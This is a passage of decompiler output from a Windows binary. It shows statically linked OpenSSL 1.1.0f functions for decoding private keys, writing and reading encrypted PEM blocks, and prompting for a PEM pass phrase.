    for ( i = sub_1400296E0(v2) - 1; i >= 0; --i )
    {
      v4 = (void **)sub_140029880((__int64)v2, i);
      sub_14001D930(v4[2]);
      sub_14001D930(v4[1]);
      sub_14001D930(v4);
    }
    sub_1400294B0((void **)v2);
    sub_14001D930(*(void **)a1);
    sub_14001D930((void *)a1);
  }
}

//----- (00000001400A2460) ----------------------------------------------------
_DWORD *__fastcall sub_1400A2460(int a1, _DWORD **a2, char **a3, unsigned int a4)
{
  _DWORD *v8; // rbx
  unsigned int (__fastcall *v9)(_DWORD *, char **, _QWORD); // r9
  __int64 v10; // rax
  unsigned int *v11; // rsi
  _DWORD *v12; // rbp
  char *v14; // [rsp+58h] [rbp+10h] BYREF

  v14 = *a3;
  if ( a2 && (v8 = *a2) != 0i64 )
  {
    sub_140025890(*((_QWORD *)v8 + 3));
    *((_QWORD *)v8 + 3) = 0i64;
  }
  else
  {
    v8 = sub_14001D530();
    if ( !v8 )
    {
      sub_140024610(13, 154, 6, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\d2i_pr.c", 29);
      return 0i64;
    }
  }
  if ( !(unsigned int)sub_14001D6E0((__int64)v8, a1) )
  {
    sub_140024610(13, 154, 163, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\d2i_pr.c", 41);
    goto LABEL_18;
  }
  v9 = *(unsigned int (__fastcall **)(_DWORD *, char **, _QWORD))(*((_QWORD *)v8 + 2) + 184i64);
  if ( !v9 || !v9(v8, &v14, a4) )
  {
    if ( !*(_QWORD *)(*((_QWORD *)v8 + 2) + 64i64) )
    {
      sub_140024610(13, 154, 13, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\d2i_pr.c", 60);
      goto LABEL_18;
    }
    v10 = sub_140067700(0i64, &v14, a4);
    v11 = (unsigned int *)v10;
    if ( !v10 || (v12 = sub_1400A2640(v10), sub_1400675C0(v11), !v12) )
    {
LABEL_18:
      if ( !a2 || *a2 != v8 )
        sub_14001D3C0((__int64)v8);
      return 0i64;
    }
    sub_14001D3C0((__int64)v8);
    v8 = v12;
  }
  *a3 = v14;
  if ( a2 )
    *a2 = v8;
  return v8;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 140025890: using guessed type __int64 __fastcall sub_140025890(_QWORD);

//----- (00000001400A25D0) ----------------------------------------------------
void __fastcall sub_1400A25D0(unsigned int *a1)
{
  sub_140051250(a1, (__int64)&unk_140119BB0);
}

//----- (00000001400A25F0) ----------------------------------------------------
void *sub_1400A25F0()
{
  return &unk_140119BB0;
}

//----- (00000001400A2600) ----------------------------------------------------
__int64 __fastcall sub_1400A2600(__int64 *a1, char **a2, __int64 a3)
{
  return sub_1400516D0(a1, a2, a3, (__int64)&unk_140119BB0);
}

//----- (00000001400A2620) ----------------------------------------------------
__int64 __fastcall sub_1400A2620(unsigned int *a1, unsigned __int8 **a2)
{
  return sub_1400536F0(a1, a2, (__int64)&unk_140119BB0);
}

//----- (00000001400A2640) ----------------------------------------------------
_DWORD *__fastcall sub_1400A2640(__int64 a1)
{
  _DWORD *v3; // rbx
  int v4; // eax
  unsigned int (__fastcall *v5)(_DWORD *, __int64); // r8
  __int64 v6; // [rsp+30h] [rbp-78h] BYREF
  char v7[80]; // [rsp+40h] [rbp-68h] BYREF

  if ( !(unsigned int)sub_1400675F0(&v6, 0i64, 0i64, 0i64, a1) )
    return 0i64;
  v3 = sub_14001D530();
  if ( v3 )
  {
    v4 = sub_14002C260(v6);
    if ( (unsigned int)sub_14001D6E0((__int64)v3, v4) )
    {
      v5 = *(unsigned int (__fastcall **)(_DWORD *, __int64))(*((_QWORD *)v3 + 2) + 64i64);
      if ( v5 )
      {
        if ( v5(v3, a1) )
          return v3;
        sub_140024610(6, 111, 145, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\evp\\evp_pkey.c", 44);
      }
      else
      {
        sub_140024610(6, 111, 144, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\evp\\evp_pkey.c", 48);
      }
    }
    else
    {
      sub_140024610(6, 111, 118, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\evp\\evp_pkey.c", 36);
      sub_14003FE60(v7, 80, v6);
      sub_140023A40(2, "TYPE=", v7);
    }
    sub_14001D3C0((__int64)v3);
  }
  else
  {
    sub_140024610(6, 111, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\evp\\evp_pkey.c", 31);
  }
  return 0i64;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00000001400A27A0) ----------------------------------------------------
__int64 __fastcall sub_1400A27A0(__int64 *a1, _BYTE *a2, unsigned int a3)
{
  void *v5; // rax
  __int64 *v7; // [rsp+30h] [rbp-18h] BYREF
  char *v8; // [rsp+68h] [rbp+20h] BYREF

  sub_14005E890(a1, (__int64 *)&v7, &v8);
  v5 = sub_1400675E0();
  return sub_1400B9540(v7, (__int64)v5, a2, a3, v8, 1);
}

//----- (00000001400A2800) ----------------------------------------------------
__int64 __fastcall sub_1400A2800(
        __int64 (__fastcall *a1)(__int64, char **),
        __int64 a2,
        __int64 a3,
        __int64 a4,
        unsigned int *a5,
        char *a6,
        int a7,
        __int64 (__fastcall *a8)(char *, __int64, __int64, _BYTE *),
        _BYTE *a9)
{
  unsigned int v9; // edi
  char *v11; // r12
  int *v13; // r13
  char *v14; // r15
  unsigned int v15; // eax
  int v16; // eax
  char *v17; // rax
  unsigned int v18; // eax
  int v19; // esi
  int v20; // eax
  int v21; // ebx
  unsigned int v22; // eax
  int *v23; // rax
  unsigned int v24; // ebx
  char *i; // rax
  int v26; // eax
  int v28; // [rsp+40h] [rbp-C0h] BYREF
  int v29; // [rsp+44h] [rbp-BCh] BYREF
  unsigned int v30; // [rsp+48h] [rbp-B8h]
  _BYTE *v31; // [rsp+50h] [rbp-B0h]
  char *v32; // [rsp+58h] [rbp-A8h]
  char *v33; // [rsp+60h] [rbp-A0h] BYREF
  __int64 (__fastcall *v34)(char *, __int64, __int64, _BYTE *); // [rsp+68h] [rbp-98h]
  __int64 v35; // [rsp+70h] [rbp-90h]
  __int64 v36; // [rsp+78h] [rbp-88h]
  unsigned __int8 v37[16]; // [rsp+80h] [rbp-80h] BYREF
  _BYTE v38[64]; // [rsp+90h] [rbp-70h] BYREF
  char v39[1024]; // [rsp+D0h] [rbp-30h] BYREF

  v9 = 0;
  v11 = a6;
  v34 = a8;
  v13 = 0i64;
  v14 = 0i64;
  v31 = a9;
  v36 = a3;
  v35 = a2;
  v30 = 0;
  v28 = 0;
  v29 = 0;
  v32 = 0i64;
  if ( a5 )
  {
    v15 = sub_14001D4F0(a5);
    v32 = sub_14002C1A0(v15);
    if ( !v32 || !(unsigned int)sub_140024EA0((__int64)a5) )
    {
      sub_140024610(9, 105, 113, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\pem\\pem_lib.c", 309);
      goto LABEL_38;
    }
  }
  v16 = a1(a4, 0i64);
  v30 = v16;
  if ( v16 < 0 )
  {
    sub_140024610(9, 105, 13, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\pem\\pem_lib.c", 315);
    v30 = 0;
    goto LABEL_38;
  }
  v17 = (char *)sub_14001D8E0((unsigned int)(v16 + 20));
  v14 = v17;
  if ( !v17 )
  {
    sub_140024610(9, 105, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\pem\\pem_lib.c", 323);
    goto LABEL_38;
  }
  v33 = v17;
  v18 = a1(a4, &v33);
  v28 = v18;
  v19 = 1;
  if ( !a5 )
  {
    v39[0] = 0;
    goto LABEL_35;
  }
  if ( a6 )
  {
    v21 = a7;
  }
  else
  {
    if ( v34 )
      v20 = v34(v39, 1024i64, 1i64, v31);
    else
      v20 = sub_1400A2E30(v39, 1024, 1, v31);
    v21 = v20;
    if ( v20 <= 0 )
    {
      sub_140024610(9, 105, 111, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\pem\\pem_lib.c", 336);
      goto LABEL_38;
    }
    v18 = v28;
    v11 = v39;
  }
  sub_140025410((__int64)v14, v18);
  if ( (int)sub_140024EA0((__int64)a5) > 16 )
    sub_1400234A0(
      "assertion failed: EVP_CIPHER_iv_length(enc) <= (int)sizeof(iv)",
      "..\\..\\openssl-1.1.0f\\crypto\\pem\\pem_lib.c",
      346i64);
  v22 = sub_140024EA0((__int64)a5);
  if ( (int)sub_140025460((__int64)v37, v22) > 0 )
  {
    v23 = (int *)sub_14005B3C0();
    if ( (unsigned int)sub_1400B9810((__int64)a5, v23, (__int64)v37, (__int64)v11, v21, 1u, v38, 0i64) )
    {
      if ( v11 == v39 )
        sub_140023440((__int64)v39, 1024i64);
      v24 = 0;
      for ( i = v32; *i; ++v24 )
      {
        if ( v24 >= 0x80000000 )
          break;
        ++i;
      }
      if ( (v24 & 0x7FFFFFFF) + 2 * ((unsigned int)sub_140024EA0((__int64)a5) + 18) > 0x400 )
        sub_1400234A0(
          "assertion failed: strlen(objstr) + 23 + 2 * EVP_CIPHER_iv_length(enc) + 13 <= sizeof buf",
          "..\\..\\openssl-1.1.0f\\crypto\\pem\\pem_lib.c",
          360i64);
      v39[0] = 0;
      sub_14003BFE0(v39, "Proc-Type: 4,", 0x400ui64);
      sub_14003BFE0(v39, "ENCRYPTED", 0x400ui64);
      sub_14003BFE0(v39, "\n", 0x400ui64);
      v26 = sub_140024EA0((__int64)a5);
      sub_1400A2F60(v39, v32, v26, v37);
      v13 = (int *)sub_14001B520();
      if ( v13 )
      {
        if ( (unsigned int)sub_14001C050(v13, (int *)a5, 0i64, (__int64)v38, v37)
          && (unsigned int)sub_14001C080(v13, v14, &v29, v14, v28)
          && (unsigned int)sub_14001BF20((unsigned int *)v13, (__int64)&v14[v29], &v28) )
        {
          v18 = v29 + v28;
          v28 += v29;
LABEL_35:
          v28 = sub_1400A3D50(v36, v35, (__int64)v39, (__int64)v14, v18);
          if ( v28 <= 0 )
            v19 = 0;
          v9 = v19;
        }
      }
    }
  }
LABEL_38:
  sub_140023440((__int64)v38, 64i64);
  sub_140023440((__int64)v37, 16i64);
  sub_14001B4E0(v13);
  sub_140023440((__int64)v39, 1024i64);
  sub_14001DA40(v14, v30, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\pem\\pem_lib.c", 0x184u);
  return v9;
}
// 14001B4E0: using guessed type __int64 __fastcall sub_14001B4E0(_QWORD);
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 1400A2800: using guessed type unsigned int *arg_20;
// 1400A2800: using guessed type _BYTE var_490[64];

//----- (00000001400A2C30) ----------------------------------------------------
__int64 __fastcall sub_1400A2C30(
        _QWORD *a1,
        int *a2,
        char **a3,
        const char *a4,
        __int64 a5,
        __int64 (__fastcall *a6)(char *, __int64, _QWORD, _BYTE *),
        void *a7)
{
  unsigned int v7; // edi
  char *v12; // rbx
  void *v14; // rbp
  int v15; // eax
  void *v16; // rsi
  int v17; // eax
  int v18; // [rsp+30h] [rbp-98h] BYREF
  void *v19; // [rsp+38h] [rbp-90h] BYREF
  int v20[2]; // [rsp+40h] [rbp-88h] BYREF
  char *v21; // [rsp+48h] [rbp-80h] BYREF
  void *Src; // [rsp+50h] [rbp-78h]
  __int64 v23[3]; // [rsp+58h] [rbp-70h] BYREF

  v7 = 0;
  Src = a7;
  v21 = 0i64;
  v19 = 0i64;
  *(_QWORD *)v20 = 0i64;
  if ( (unsigned int)sub_1400A3630(a5, &v21, &v19, v20, &v18) )
  {
    while ( 1 )
    {
      v12 = v21;
      if ( (unsigned int)sub_1400A4030(v21, a4) )
        break;
      sub_14001D930(v12);
      sub_14001D930(v19);
      sub_14001D930(*(void **)v20);
      if ( !(unsigned int)sub_1400A3630(a5, &v21, &v19, v20, &v18) )
        goto LABEL_4;
    }
    v14 = v19;
    v15 = sub_1400A3350((const char *)v19, v23);
    v16 = *(void **)v20;
    if ( !v15 || !(unsigned int)sub_1400A3070(v23, *(char **)v20, &v18, a6, Src) )
      goto LABEL_12;
    v17 = v18;
    *a1 = v16;
    *a2 = v17;
    if ( a3 )
      *a3 = v12;
    v7 = 1;
    if ( !a3 )
LABEL_12:
      sub_14001D930(v12);
    sub_14001D930(v14);
    if ( !v7 )
      sub_14001D930(v16);
    return v7;
  }
  else
  {
LABEL_4:
    if ( (sub_140024460() & 0xFFF) == 108 )
      sub_140023A40(2, "Expecting: ", a4);
    return 0i64;
  }
}
// 1400A2C30: using guessed type _QWORD arg_28;
// 1400A2C30: using guessed type __int64 var_70[3];

//----- (00000001400A2E30) ----------------------------------------------------
int __fastcall sub_1400A2E30(_BYTE *a1, int a2, int a3, _BYTE *a4)
{
  size_t v4; // rbp
  unsigned int v7; // ebx
  _BYTE *i; // rax
  int v9; // ebx
  int result; // eax
  char *v11; // rax
  const char *v12; // r14
  int v13; // ebx
  FILE *v14; // rax

  v4 = (unsigned int)a2;
  if ( a4 )
  {
    v7 = 0;
    for ( i = a4; *i; ++v7 )
    {
      if ( v7 >= 0x80000000 )
        break;
      ++i;
    }
    v9 = v7 & 0x7FFFFFFF;
    if ( v9 > a2 )
      v9 = a2;
    memmove(a1, a4, v9);
    return v9;
  }
  else
  {
    v11 = sub_1400B9AB0();
    v12 = "Enter PEM pass phrase:";
    if ( v11 )
      v12 = v11;
    v13 = a3 != 0 ? 4 : 0;
    if ( (unsigned int)sub_1400B9AD0(a1, v13, v4, (__int64)v12, a3) )
    {
LABEL_14:
      sub_140024610(9, 100, 109, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\pem\\pem_lib.c", 64);
      memset(a1, 0, v4);
      return -1;
    }
    else
    {
      while ( 1 )
      {
        result = sub_140023980(a1);
        if ( !a3 || result >= v13 )
          break;
        v14 = _acrt_iob_func(2u);
        sub_140002640((__int64)v14, (__int64)"phrase is too short, needs to be at least %d chars\n", (unsigned int)v13);
        if ( (unsigned int)sub_1400B9AD0(a1, v13, v4, (__int64)v12, a3) )
          goto LABEL_14;
      }
    }
  }
  return result;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00000001400A2F60) ----------------------------------------------------
__int64 __fastcall sub_1400A2F60(_BYTE *a1, _BYTE *a2, int a3, unsigned __int8 *a4)
{
  __int64 v4; // rbp
  int v8; // r9d
  _BYTE *v9; // rax
  unsigned int i; // ecx
  int v11; // r8d
  __int64 result; // rax
  __int64 v13; // rdx
  __int64 v14; // rax
  _BYTE *v15; // rax
  unsigned __int64 v16; // rcx
  int v17; // ecx

  v4 = a3;
  sub_14003BFE0(a1, "DEK-Info: ", 0x400ui64);
  sub_14003BFE0(a1, a2, 0x400ui64);
  sub_14003BFE0(a1, ",", 0x400ui64);
  v8 = 0;
  v9 = a1;
  for ( i = 0; *v9; ++i )
  {
    if ( i >= 0x80000000 )
      break;
    ++v9;
  }
  v11 = i & 0x7FFFFFFF;
  result = (i & 0x7FFFFFFF) + 2 * (_DWORD)v4;
  if ( (int)result < 1024 )
  {
    v13 = v4;
    if ( (int)v4 > 0 )
    {
      v14 = i;
      LODWORD(v14) = i & 0x7FFFFFFF;
      v8 = v4;
      v15 = &a1[v14];
      do
      {
        v15 += 2;
        v16 = (unsigned __int64)*a4++ >> 4;
        *(v15 - 2) = a0123456789abcd_4[v16];
        *(v15 - 1) = a0123456789abcd_4[*(a4 - 1) & 0xF];
        --v13;
      }
      while ( v13 );
    }
    v17 = v11 + 2 * v8;
    a1[v17] = 10;
    result = (unsigned int)(v17 + 1);
    a1[(int)result] = 0;
  }
  return result;
}

//----- (00000001400A3070) ----------------------------------------------------
__int64 __fastcall sub_1400A3070(
        __int64 *a1,
        char *a2,
        int *a3,
        __int64 (__fastcall *a4)(char *, __int64, _QWORD, _BYTE *),
        _BYTE *Src)
{
  bool v5; // zf
  unsigned int v10; // eax
  _BYTE *j; // rcx
  unsigned int v12; // eax
  int v13; // ebx
  char *v14; // rax
  const char *v15; // r9
  unsigned int v16; // eax
  char *i; // rcx
  int v18; // eax
  int *v19; // rax
  int *v20; // rax
  int *v21; // rdi
  unsigned int v22; // ebx
  __int64 v23; // rax
  int v24[4]; // [rsp+40h] [rbp-498h] BYREF
  _BYTE v25[64]; // [rsp+50h] [rbp-488h] BYREF
  char v26[1024]; // [rsp+90h] [rbp-448h] BYREF

  v5 = *a1 == 0;
  v24[0] = *a3;
  if ( v5 )
    return 1i64;
  if ( a4 )
  {
    v18 = a4(v26, 1024i64, 0i64, Src);
LABEL_20:
    v13 = v18;
    goto LABEL_21;
  }
  if ( !Src )
  {
    v14 = sub_1400B9AB0();
    v15 = "Enter PEM pass phrase:";
    if ( v14 )
      v15 = v14;
    if ( (unsigned int)sub_1400B9AD0(v26, 0, 1024, (__int64)v15, 0) )
    {
      sub_140024610(9, 100, 109, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\pem\\pem_lib.c", 64);
      memset(v26, 0, sizeof(v26));
LABEL_22:
      sub_140024610(9, 106, 104, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\pem\\pem_lib.c", 418);
      return 0i64;
    }
    v16 = 0;
    for ( i = v26; *i; ++v16 )
    {
      if ( v16 >= 0x80000000 )
        break;
      ++i;
    }
    v18 = v16 & 0x7FFFFFFF;
    goto LABEL_20;
  }
  v10 = 0;
  for ( j = Src; *j; ++v10 )
  {
    if ( v10 >= 0x80000000 )
      break;
    ++j;
  }
  v12 = v10 & 0x7FFFFFFF;
  if ( v12 > 0x400 )
    v12 = 1024;
  v13 = v12;
  memmove(v26, Src, v12);
LABEL_21:
  if ( v13 <= 0 )
    goto LABEL_22;
  v19 = (int *)sub_14005B3C0();
  if ( !(unsigned int)sub_1400B9810(*a1, v19, (__int64)(a1 + 1), (__int64)v26, v13, 1u, v25, 0i64) )
    return 0i64;
  v20 = (int *)sub_14001B520();
  v21 = v20;
  if ( !v20 )
    return 0i64;
  v22 = sub_14001BCA0(v20, (int *)*a1, 0i64, (__int64)v25, a1 + 1);
  if ( v22
    && (v22 = sub_14001BCD0(v21, a2, v24, a2, v24[0])) != 0
    && (v23 = v24[0], *a3 = v24[0], (v22 = sub_14001BB00((char *)v21, &a2[v23], v24)) != 0) )
  {
    *a3 += v24[0];
  }
  else
  {
    sub_140024610(9, 106, 101, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\pem\\pem_lib.c", 445);
  }
  sub_14001B4E0(v21);
  sub_140023440((__int64)v26, 1024i64);
  sub_140023440((__int64)v25, 64i64);
  return v22;
}
// 14001B4E0: using guessed type __int64 __fastcall sub_14001B4E0(_QWORD);
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 1400A3070: using guessed type _BYTE var_488[64];

//----- (00000001400A3350) ----------------------------------------------------
__int64 __fastcall sub_1400A3350(const char *a1, __int64 *a2)
{
  unsigned int v2; // ebp
  const char *v6; // rbx
  char v7; // al
  _BYTE *v8; // rbx
  const char *v9; // rbx
  __int64 v10; // rsi
  __int64 v11; // rdi
  char *v12; // rsi
  char v13; // bl
  __int64 v14; // rax
  __int64 v15; // rdi
  char *v16; // rsi
  int v17; // eax
  bool v18; // zf
  char v19; // cl
  int v20; // eax
  char *v21; // [rsp+50h] [rbp+8h] BYREF

  v2 = 0;
  *a2 = 0i64;
  if ( !a1 || !*a1 || *a1 == 10 )
    return 1i64;
  if ( strncmp(a1, "Proc-Type:", 0xAui64) )
  {
    sub_140024610(9, 107, 107, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\pem\\pem_lib.c", 479);
    return 0i64;
  }
  v6 = &a1[unknown_libname_31(a1 + 10, " \t") + 10];
  if ( *v6 != 52 )
    return 0i64;
  v7 = v6[1];
  v8 = v6 + 2;
  if ( v7 != 44 )
    return 0i64;
  v9 = &v8[unknown_libname_31(v8, " \t")];
  if ( strncmp(v9, "ENCRYPTED", 9ui64) || !unknown_libname_31(v9 + 9, " \t\r\n") )
  {
    sub_140024610(9, 107, 106, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\pem\\pem_lib.c", 492);
    return 0i64;
  }
  v10 = (__int64)&v9[unknown_libname_31(v9 + 9, " \t\r") + 9];
  if ( *(_BYTE *)v10 != 10 )
  {
    sub_140024610(9, 107, 112, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\pem\\pem_lib.c", 498);
    return 0i64;
  }
  if ( strncmp((const char *)(v10 + 1), "DEK-Info:", 9ui64) )
  {
    sub_140024610(9, 107, 105, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\pem\\pem_lib.c", 507);
    return 0i64;
  }
  v11 = unknown_libname_31(v10 + 10, " \t") + v10 + 10;
  v12 = (char *)(unknown_libname_30(v11, " \t,") + v11);
  v13 = *v12;
  *v12 = 0;
  v14 = sub_14001E950(v11);
  *a2 = v14;
  *v12 = v13;
  v15 = v14;
  v16 = &v12[unknown_libname_31(v12, " \t")];
  v21 = v16;
  if ( v15 )
  {
    v17 = sub_140024EA0(v15);
    v18 = v17 == 0;
    if ( v17 > 0 )
    {
      v19 = *v16++;
      v21 = v16;
      if ( v19 != 44 )
      {
        sub_140024610(9, 107, 129, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\pem\\pem_lib.c", 531);
        return 0i64;
      }
      v18 = v17 == 0;
    }
    if ( !v18 || *v16 != 44 )
    {
      v20 = sub_140024EA0(v15);
      LOBYTE(v2) = (unsigned int)sub_1400A4340(&v21, a2 + 1, v20) != 0;
      return v2;
    }
    sub_140024610(9, 107, 130, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\pem\\pem_lib.c", 534);
    return 0i64;
  }
  sub_140024610(9, 107, 114, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\pem\\pem_lib.c", 526);
  return 0i64;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 1400C8CB4: using guessed type __int64 __fastcall unknown_libname_30(_QWORD, _QWORD);
// 1400C8D54: using guessed type __int64 __fastcall unknown_libname_31(_QWORD, _QWORD);

//----- (00000001400A3630) ----------------------------------------------------
__int64 __fastcall sub_1400A3630(__int64 a1, _QWORD *a2, _QWORD *a3, _QWORD *a4, _DWORD *a5)
{
  unsigned int v6; // r14d
  int v7; // r13d
  unsigned __int8 **v9; // rdi
  unsigned __int8 **v10; // rax
  unsigned __int8 **v11; // r15
  __int64 v12; // rdx
  int v13; // ecx
  __int64 v14; // r8
  __int64 v15; // r9
  __int64 i; // rax
  int v17; // ecx
  int v18; // eax
  unsigned int v19; // ebx
  char *j; // rax
  int v21; // ebx
  int *v22; // rdi
  int v23; // esi
  __int64 v24; // rdx
  int v25; // ecx
  __int64 v26; // r8
  __int64 v27; // r9
  __int64 k; // rax
  int v29; // ecx
  __int64 v30; // rax
  __int64 v31; // rcx
  size_t v32; // rbx
  int v33; // edi
  __int64 v34; // rdx
  __int64 v35; // rcx
  int v36; // ebx
  __int64 v37; // r8
  __int64 v38; // r9
  int v39; // esi
  __int64 m; // rax
  int v41; // ebx
  __int64 v42; // rax
  int v43; // ebx
  unsigned __int8 **v44; // rbx
  _BYTE *ii; // rax
  unsigned int v46; // r14d
  int v47; // eax
  __int64 v48; // r8
  __int64 v49; // r9
  int v50; // edx
  __int64 n; // rcx
  __int64 v52; // rdx
  bool v53; // zf
  int v54; // ecx
  void **v55; // r9
  int v56; // [rsp+30h] [rbp-D0h] BYREF
  unsigned __int8 **v57; // [rsp+38h] [rbp-C8h]
  int *v58; // [rsp+40h] [rbp-C0h]
  void **v59; // [rsp+48h] [rbp-B8h]
  int v60; // [rsp+50h] [rbp-B0h] BYREF
  _QWORD *v61; // [rsp+58h] [rbp-A8h]
  _QWORD *v62; // [rsp+60h] [rbp-A0h]
  _QWORD *v63; // [rsp+68h] [rbp-98h]
  _DWORD *v64; // [rsp+70h] [rbp-90h]
  char Str1[9]; // [rsp+80h] [rbp-80h] BYREF
  char Str2[2]; // [rsp+89h] [rbp-77h] BYREF
  char Src[245]; // [rsp+8Bh] [rbp-75h] BYREF

  v64 = a5;
  v63 = a4;
  v62 = a3;
  v61 = a2;
  v6 = 0;
  v58 = (int *)sub_1400B9FD0();
  v56 = 0;
  v7 = 0;
  if ( !v58 )
  {
    sub_140024610(9, 109, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\pem\\pem_lib.c", 675);
    return 0i64;
  }
  v59 = (void **)sub_1400825B0();
  v9 = (unsigned __int8 **)sub_1400825B0();
  v57 = v9;
  v10 = (unsigned __int8 **)sub_1400825B0();
  v11 = v10;
  if ( !v59 || !v9 || !v10 )
    goto LABEL_18;
  Src[243] = 0;
  v13 = sub_140029D60(a1, (__int64)Str1, 0xFEu);
  if ( v13 <= 0 )
  {
LABEL_17:
    sub_140024610(9, 109, 108, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\pem\\pem_lib.c", 691);
LABEL_18:
    v22 = v58;
    goto LABEL_19;
  }
  while ( 1 )
  {
    for ( i = v13; i >= 0; --i )
    {
      if ( Str1[i] > 32 )
        break;
      --v13;
    }
    v17 = v13 + 1;
    Str1[v17] = 10;
    v18 = v17 + 1;
    if ( (unsigned __int64)(v17 + 1) >= 0x100 )
      _report_rangecheckfailure(v18, v12, v14, v15);
    Str1[v18] = 0;
    if ( !strncmp(Str1, "-----BEGIN ", 0xBui64) )
    {
      v19 = 0;
      for ( j = Src; *j; ++v19 )
      {
        if ( v19 >= 0x80000000 )
          break;
        ++j;
      }
      v21 = v19 & 0x7FFFFFFF;
      if ( !strncmp(&Str1[v21 + 5], "-----\n", 6ui64) )
        break;
    }
    v13 = sub_140029D60(a1, (__int64)Str1, 0xFEu);
    if ( v13 <= 0 )
      goto LABEL_17;
  }
  if ( !sub_1400822F0((__int64)v59, v21 + 9) )
  {
    sub_140024610(9, 109, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\pem\\pem_lib.c", 706);
    goto LABEL_18;
  }
  memmove(v59[1], Src, v21 - 6);
  v23 = 0;
  *((_BYTE *)v59[1] + v21 - 6) = 0;
  if ( !sub_1400822F0((__int64)v9, 0x100ui64) )
  {
    sub_140024610(9, 109, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\pem\\pem_lib.c", 716);
    goto LABEL_18;
  }
  *v9[1] = 0;
  v25 = sub_140029D60(a1, (__int64)Str1, 0xFEu);
  if ( v25 > 0 )
  {
    while ( 1 )
    {
      for ( k = v25; k >= 0; --k )
      {
        if ( Str1[k] > 32 )
          break;
        --v25;
      }
      v29 = v25 + 1;
      v30 = v29;
      v31 = (unsigned int)(v29 + 1);
      v32 = (int)v31;
      Str1[v30] = 10;
      if ( (unsigned __int64)(int)v31 >= 0x100 )
        _report_rangecheckfailure(v31, v24, v26, v27);
      Str1[(int)v31] = 0;
      if ( Str1[0] == 10 )
        goto LABEL_34;
      v33 = v31 + v23;
      if ( !sub_1400822F0((__int64)v57, (int)v31 + v23 + 9) )
        break;
      if ( !strncmp(Str1, "-----END ", 9ui64) )
      {
        v7 = 1;
LABEL_34:
        v9 = v57;
        goto LABEL_35;
      }
      memmove(&v57[1][v23], Str1, v32);
      v23 = v33;
      v57[1][v33] = 0;
      v25 = sub_140029D60(a1, (__int64)Str1, 0xFEu);
      if ( v25 <= 0 )
        goto LABEL_34;
    }
    sub_140024610(9, 109, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\pem\\pem_lib.c", 733);
    goto LABEL_18;
  }
LABEL_35:
  v56 = 0;
  if ( !sub_1400822F0((__int64)v11, 0x400ui64) )
  {
    sub_140024610(9, 109, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\pem\\pem_lib.c", 747);
    goto LABEL_18;
  }
  *v11[1] = 0;
  if ( v7 )
  {
    v44 = v11;
    v56 = v23;
    v57 = v11;
    v11 = v9;
  }
  else
  {
    v36 = sub_140029D60(a1, (__int64)Str1, 0xFEu);
    if ( v36 > 0 )
    {
      v39 = 0;
      do
      {
        for ( m = v36; m >= 0; --m )
        {
          if ( Str1[m] > 32 )
            break;
          --v36;
        }
        v41 = v36 + 1;
        v42 = v41;
        v43 = v41 + 1;
        Str1[v42] = 10;
        if ( (unsigned __int64)v43 >= 0x100 )
          _report_rangecheckfailure(v35, v34, v37, v38);
        Str1[v43] = 0;
        if ( v43 != 65 )
          v39 = 1;
        if ( !strncmp(Str1, "-----END ", 9ui64) || v43 > 65 )
          break;
        if ( !sub_140082440((__int64)v11, v43 + v56 + 9) )
        {
          sub_140024610(9, 109, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\pem\\pem_lib.c", 769);
          goto LABEL_18;
        }
        memmove(&v11[1][v56], Str1, v43);
        v11[1][v43 + v56] = 0;
        v56 += v43;
        if ( v39 )
        {
          Str1[0] = 0;
          v47 = sub_140029D60(a1, (__int64)Str1, 0xFEu);
          v50 = v47;
          if ( v47 > 0 )
          {
            for ( n = v47; n >= 0; --n )
            {
              if ( Str1[n] > 32 )
                break;
              --v50;
            }
            v52 = (unsigned int)(v50 + 1);
            Str1[(int)v52] = 10;
            if ( (unsigned __int64)((int)v52 + 1) >= 0x100 )
              _report_rangecheckfailure((int)v52 + 1, v52, v48, v49);
            Str1[(int)v52 + 1] = 0;
          }
          break;
        }
        v36 = sub_140029D60(a1, (__int64)Str1, 0xFEu);
      }
      while ( v36 > 0 );
    }
    v44 = v57;
  }
  for ( ii = v59[1]; *ii; ++v6 )
  {
    if ( v6 >= 0x80000000 )
      break;
    ++ii;
  }
